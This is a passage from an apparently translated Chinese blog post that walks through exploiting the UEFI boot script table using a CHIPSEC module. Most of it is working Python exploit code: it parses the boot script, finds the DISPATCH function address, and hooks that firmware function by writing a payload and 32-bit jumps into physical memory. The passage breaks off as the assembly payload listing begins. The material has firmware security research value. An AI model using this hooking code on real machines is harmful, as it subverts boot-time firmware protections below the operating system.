class="line">                bus, dev, fun, off = (addr &gt;&gt; 24) &amp; 0xff, (addr &gt;&gt; 16) &amp; 0xff, \</span><br><span class="line">                                     (addr &gt;&gt; 8) &amp; 0xff,  (addr &gt;&gt; 0) &amp; 0xff               </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                # get values list</span><br><span class="line">                values = self.read_values(data[32:], width, count)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                self.process_pci_config_write(width, bus, dev, fun, off, count, values)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            elif op == self.EFI_BOOT_SCRIPT_IO_WRITE_OPCODE:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                # get value information</span><br><span class="line">                width, count = byte_at(data, 9), qword_at(data, 16)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                # get I/O port number</span><br><span class="line">                port = word_at(data, 10)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                # get values list</span><br><span class="line">                values = self.read_values(data[24:], width, count)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                self.process_io_write(width, port, count, values)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            elif op == self.EFI_BOOT_SCRIPT_DISPATCH_OPCODE:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                # get call address</span><br><span class="line">                addr = qword_at(data, 16)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                self.process_dispatch(addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            else:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                # skip unknown instruction</span><br><span class="line">                pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            # go to the next instruction</span><br><span class="line">            data = data[size:]</span><br><span class="line">            ptr += size</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    EFI_BOOT_SCRIPT_IO_WRITE_OPCODE = 0x00</span><br><span class="line">    EFI_BOOT_SCRIPT_IO_READ_WRITE_OPCODE = 0x01</span><br><span class="line">    EFI_BOOT_SCRIPT_MEM_WRITE_OPCODE = 0x02</span><br><span class="line">    EFI_BOOT_SCRIPT_MEM_READ_WRITE_OPCODE = 0x03</span><br><span class="line">    EFI_BOOT_SCRIPT_PCI_CONFIG_WRITE_OPCODE = 0x04</span><br><span class="line">    EFI_BOOT_SCRIPT_PCI_CONFIG_READ_WRITE_OPCODE = 0x05</span><br><span class="line">    EFI_BOOT_SCRIPT_SMBUS_EXECUTE_OPCODE = 0x06</span><br><span class="line">    EFI_BOOT_SCRIPT_STALL_OPCODE = 0x07</span><br><span class="line">    EFI_BOOT_SCRIPT_DISPATCH_OPCODE = 0x08</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    boot_script_ops = [</span><br><span class="line">        &#x27;IO_WRITE&#x27;,</span><br><span class="line">        &#x27;IO_READ_WRITE&#x27;,</span><br><span class="line">        &#x27;MEM_WRITE&#x27;,</span><br><span class="line">        &#x27;MEM_READ_WRITE&#x27;,</span><br><span class="line">        &#x27;PCI_CONFIG_WRITE&#x27;,</span><br><span class="line">        &#x27;PCI_CONFIG_READ_WRITE&#x27;,</span><br><span class="line">        &#x27;SMBUS_EXECUTE&#x27;,</span><br><span class="line">        &#x27;STALL&#x27;,</span><br><span class="line">        &#x27;DISPATCH&#x27; ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    EfiBootScriptWidthUint8 = 0</span><br><span class="line">    EfiBootScriptWidthUint16 = 1</span><br><span class="line">    EfiBootScriptWidthUint32 = 2</span><br><span class="line">    EfiBootScriptWidthUint64 = 3</span><br><span class="line">    EfiBootScriptWidthFifoUint8 = 4</span><br><span class="line">    EfiBootScriptWidthFifoUint16 = 5</span><br><span class="line">    EfiBootScriptWidthFifoUint32 = 6</span><br><span class="line">    EfiBootScriptWidthFifoUint64 = 7</span><br><span class="line">    EfiBootScriptWidthFillUint8 = 8</span><br><span class="line">    EfiBootScriptWidthFillUint16 = 9</span><br><span class="line">    EfiBootScriptWidthFillUint32 = 10</span><br><span class="line">    EfiBootScriptWidthFillUint64 = 11</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    boot_script_width = [</span><br><span class="line">        &#x27;Uint8&#x27;,</span><br><span class="line">        &#x27;Uint16&#x27;,</span><br><span class="line">        &#x27;Uint32&#x27;,</span><br><span class="line">        &#x27;Uint64&#x27;,</span><br><span class="line">        &#x27;FifoUint8&#x27;,</span><br><span class="line">        &#x27;FifoUint16&#x27;,</span><br><span class="line">        &#x27;FifoUint32&#x27;,</span><br><span class="line">        &#x27;FifoUint64&#x27;,</span><br><span class="line">        &#x27;FillUint8&#x27;,</span><br><span class="line">        &#x27;FillUint16&#x27;,</span><br><span class="line">        &#x27;FillUint32&#x27;,</span><br><span class="line">        &#x27;FillUint64&#x27; ]</span><br></pre></td></tr></table></figure>


<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>转储的引导脚本表有大约1000个条目，下面是一些从表头开始的文本转储数据:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">UEFI boot script addr = 0xd5f4c018</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#0 len=33 MEM_WRITE</span><br><span class="line">Width: Uint8, Addr: 0x00000000fec00000, Count: 1</span><br><span class="line">Value: 0x0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#1 len=36 MEM_WRITE</span><br><span class="line">Width: Uint32, Addr: 0x00000000fec00004, Count: 1</span><br><span class="line">Value: 0x8000000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#2 len=33 MEM_WRITE</span><br><span class="line">Width: Uint8, Addr: 0x00000000fec00000, Count: 1</span><br><span class="line">Value: 0x10</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#3 len=36 MEM_WRITE</span><br><span class="line">Width: Uint32, Addr: 0x00000000fec00004, Count: 1</span><br><span class="line">Value: 0x700</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#4 len=36 MEM_WRITE</span><br><span class="line">Width: Uint32, Addr: 0x00000000fed1f404, Count: 1</span><br><span class="line">Value: 0x80</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#5 len=40 MEM_READ_WRITE</span><br><span class="line">000000ae: 05 00 00 00 28 00 00 00 03 02 00 00 00 00 00 00 | ................</span><br><span class="line">000000be: 14 90 d1 fe 00 00 00 00 00 00 00 00 00 00 00 00 | ................</span><br><span class="line">000000ce: 01 00 00 00 00 00 00 00                         | ........</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#6 len=40 MEM_READ_WRITE</span><br><span class="line">000000d6: 06 00 00 00 28 00 00 00 03 00 00 00 00 00 00 00 | ................</span><br><span class="line">000000e6: 04 90 d1 fe 00 00 00 00 01 00 00 00 00 00 00 00 | ................</span><br><span class="line">000000f6: f8 00 00 00 00 00 00 00                         | ........</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#7 len=40 MEM_READ_WRITE</span><br><span class="line">000000fe: 07 00 00 00 28 00 00 00 03 02 00 00 00 00 00 00 | ................</span><br><span class="line">0000010e: 20 90 d1 fe 00 00 00 00 02 00 00 01 00 00 00 00 | ................</span><br><span class="line">0000011e: 01 ff ff f8 00 00 00 00                         | ........</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#8 len=40 MEM_READ_WRITE</span><br><span class="line">00000126: 08 00 00 00 28 00 00 00 03 02 00 00 00 00 00 00 | ................</span><br><span class="line">00000136: 20 90 d1 fe 00 00 00 00 00 00 00 80 00 00 00 00 | ................</span><br><span class="line">00000146: ff ff ff ff 00 00 00 00                         | ........</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#9 len=24 DISPATCH</span><br><span class="line">Call addr: 0x00000000d5ddf260</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">... around 1000 of other boot script table entries that was skipped,</span><br><span class="line">完整的转储数据[在这](http://www.everfall.com/paste/id.php?e3lvi3za5co9)</span><br></pre></td></tr></table></figure>


<p>如你所见，该表有一个<code>EFI_BOOT_SCRIPT_DISPATCH_OPCODE</code>条目(#9)，用于在<code>0xd5ddf260</code>地址上调用固件函数。该攻击的原始描述为假设将恶意的<code>EFI_BOOT_SCRIPT_DISPATCH_OPCODE</code>项插入到表中，但在实践中，当攻击者需要处理来自不同制造商的许多不同固件版本时，最好避免修改引导脚本表，hook原始引导脚本调用的固件函数的机器码。<br>让我们来用Python和<a target="_blank" rel="noopener" href="https://github.com/chipsec/chipsec">CHIPSCE</a>（英特尔的平台安全评估框架）编写PoC，CHIPSCE的一些官方描述：</p>
<blockquote>
<p>CHIPSEC是一个分析PC平台(包括硬件)安全性的框架，系统固件包括BIOS&#x2F;UEFI，平台组件配置。它允许为各种低级组件和接口创建安全测试套件、安全评估工具，以及固件的取证功能。 CHIPSEC可以在以下任何环境中运行:</p>
</blockquote>
<ul>
<li>Windows (client and server)</li>
<li>Linux</li>
<li>UEFI Shell</li>
</ul>
<p>CHIPSEC已经有了一套出色的<a target="_blank" rel="noopener" href="https://github.com/chipsec/chipsec/tree/master/chipsec/modules/tools">示例</a>，它们涵盖了几乎所有已知的针对SMM、安全引导、BIOS更新、flash写保护等的攻击。因此，我决定将引导脚本表漏洞PoC实现为CHIPSEC模块，主要是为了将一整套BIOS漏洞作为一个工具。当然，也可以用C实现这个漏洞利用，作为独立的Linux内核模块、Windows驱动程序或其他你喜欢的东西。<br>新模块可以用template来创建：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd chipsec/source/tool/chipsec/modules</span><br><span class="line">$ cp module_template.py boot_script_table.py &amp;&amp; vim boot_script_table.py</span><br></pre></td></tr></table></figure>


<p>模块框架示例：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> chipsec.module_common <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># import required API</span></span><br><span class="line"><span class="keyword">from</span> chipsec.hal.uefi <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> chipsec.hal.physmem <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_MODULE_NAME = <span class="string">&#x27;boot_script_table&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">boot_script_table</span>(<span class="title class_ inherited__">BaseModule</span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">self</span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># Main exploit code.</span></span><br><span class="line">        <span class="comment"># Possible return values:</span></span><br><span class="line">        <span class="comment"># - ModuleResult.FAILED - vulnerable</span></span><br><span class="line">        <span class="comment"># - ModuleResult.PASSED - not vulnerable</span></span><br><span class="line">        <span class="comment"># - ModuleResult.ERROR - exploitation error</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># ...</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_supported</span>(<span class="params">self</span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment"># <span class="doctag">TODO:</span> check for supported hardware and/or OS</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># --------------------------------------------------------------------------</span></span><br><span class="line">    <span class="comment"># run(module_argv)</span></span><br><span class="line">    <span class="comment"># Required function: run here all tests from this module</span></span><br><span class="line">    <span class="comment"># --------------------------------------------------------------------------</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self, module_argv</span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> self.exploit()</span><br></pre></td></tr></table></figure>


<p>首先我们需要获取一个引导脚本表的内容:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">EFI_VAR_NAME = <span class="string">&#x27;AcpiGlobalVariable&#x27;</span></span><br><span class="line">EFI_VAR_GUID = <span class="string">&#x27;af9ffd67-ec10-488a-9dfc-6cbf5ee22c2e&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_efi_read_u32</span>(<span class="params">self, name, guid</span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dword_at(self._uefi.get_EFI_variable(name, guid, <span class="literal">None</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_mem_read</span>(<span class="params">self, addr, size</span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 定义读取的内存对齐为1000h</span></span><br><span class="line">    read_addr = addr &amp; <span class="number">0xfffffffffffff000</span></span><br><span class="line">    read_size = size + addr - read_addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    data = self._memory.read_physical_mem(read_addr, read_size)</span><br><span class="line">    <span class="keyword">return</span> data[addr - read_addr :]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取ACPI全局变量结构体数据</span></span><br><span class="line">AcpiGlobalVariable = self._efi_read_u32(self.EFI_VAR_NAME, self.EFI_VAR_GUID)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取引导脚本表地址</span></span><br><span class="line">data = self._mem_read(AcpiGlobalVariable, <span class="number">0x20</span>)</span><br><span class="line">boot_script_addr = dword_at(data, <span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取引导脚本内容</span></span><br><span class="line">boot_script = self._mem_read(boot_script_addr, <span class="number">0x8000</span>)</span><br></pre></td></tr></table></figure>


<p>现在，让我们从<code>EFI_BOOT_SCRIPT_DISPATCH_OPCODE</code>表项的第一个函数地址来 使用BootScriptParser类的修改版本 :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">CustomBootScriptParser</span>(<span class="title class_ inherited__">BootScriptParser</span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">AddressFound</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, addr</span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            self.addr = addr</span><br><span class="line">       </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">process_dispatch</span>(<span class="params">self, addr</span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 将调度指令操作数(函数地址)传递给调用者</span></span><br><span class="line">        <span class="keyword">raise</span> self.AddressFound(addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self, data, boot_script_addr = <span class="number">0L</span></span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            BootScriptParser.parse(self, data, \</span><br><span class="line">                boot_script_addr = boot_script_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> self.AddressFound <span class="keyword">as</span> e:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> e.addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 引导脚本没有任何调度指令</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析引导脚本并获取要hoot的原函数地址</span></span><br><span class="line">func_addr = self.CustomBootScriptParser(quiet = <span class="literal">True</span>).parse(boot_script)</span><br></pre></td></tr></table></figure>


<p>现在我们需要实现机器码钩子（一种经典的拼接方法），让我们把<a target="_blank" rel="noopener" href="http://www.capstone-engine.org/"> capstone engine </a>作为反汇编库。此外，该函数在可执行文件的代码尾部定位未使用的空间，用来存放漏洞利用payload和原始函数指令：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">JUMP_32_LEN = <span class="number">5</span></span><br><span class="line">JUMP_64_LEN = <span class="number">14</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_mem_write</span>(<span class="params">self, addr, data</span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    self._memory.write_physical_mem(addr, <span class="built_in">len</span>(data), data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_disasm</span>(<span class="params">self, data</span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> capstone</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取指令长度和助记符</span></span><br><span class="line">    dis = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_32)</span><br><span class="line">    <span class="keyword">for</span> insn <span class="keyword">in</span> dis.disasm(data, <span class="built_in">len</span>(data)):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> insn.mnemonic + <span class="string">&#x27; &#x27;</span> + insn.op_str, insn.size</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_jump_32</span>(<span class="params">self, src, dst</span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Jump from 0x%x to 0x%x&#x27;</span> % (src, dst)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    addr = pack(<span class="string">&#x27;I&#x27;</span>, (dst - src - self.JUMP_32_LEN) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;\xe9&#x27;</span> + addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_find_zero_bytes</span>(<span class="params">self, addr, size</span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 在代码页的末尾查找0字节</span></span><br><span class="line">    addr = (addr &amp; <span class="number">0xfffff000</span>) + <span class="number">0x1000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">       </span><br><span class="line">        <span class="keyword">if</span> self._mem_read(addr - size, size) == <span class="string">&#x27;\0&#x27;</span> * size:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            addr -= size</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        addr += <span class="number">0x1000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_hook</span>(<span class="params">self, addr, payload</span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> self._mem_read(addr, <span class="number">1</span>) == <span class="string">&#x27;\xe9&#x27;</span>:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;ERROR: Already patched&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    hook_size = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 读取0x40字节的函数代码</span></span><br><span class="line">    data = self._mem_read(addr, <span class="number">0x40</span>)</span><br><span class="line">   </span><br><span class="line">    <span class="comment"># 反汇编第一个指令以确定补丁长度</span></span><br><span class="line">    <span class="keyword">while</span> hook_size &lt; self.JUMP_32_LEN:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        mnem, size = self._disasm(data[hook_size:])</span><br><span class="line">        hook_size += size</span><br><span class="line">   </span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;%d bytes to patch&#x27;</span> % hook_size       </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 备份将被补丁替换的原始指令</span></span><br><span class="line">    data = data[:hook_size]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 为payload，原始指令和跳转找到0内存</span></span><br><span class="line">    buff_size = <span class="built_in">len</span>(payload) + hook_size + self.JUMP_32_LEN</span><br><span class="line">    buff_addr = self._find_zero_bytes(addr, buff_size)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Found %d zero bytes at 0x%x&#x27;</span> % (buff_size, buff_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 写入payload + 原始指令 + 跳转回hook的函数</span></span><br><span class="line">    buff = payload + data + \</span><br><span class="line">           self._jump_32(buff_addr + <span class="built_in">len</span>(payload) + hook_size, \</span><br><span class="line">                         addr + hook_size)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    self._mem_write(buff_addr, buff)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 从payload的函数写入32-bit的跳转地址</span></span><br><span class="line">    self._mem_write(addr, self._jump_32(addr, buff_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> buff_addr, buff_size, data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 编译payload的汇编代码</span></span><br><span class="line">payload = Asm().<span class="built_in">compile</span>(PAYLOAD)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置UEFI函数钩子来执行我们的payload</span></span><br><span class="line">payload_addr, payload_size, old_instructions = self._hook(dispatch_addr, payload)</span><br></pre></td></tr></table></figure>


<p>现在，完成了代码劫持后，让我们来编写通过简单的Python装饰器来使用nasm进行编译的payload。payload在执行过程中会收集关于SMM和flash保护的基本信息，这些信息将在稍后进行分析:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 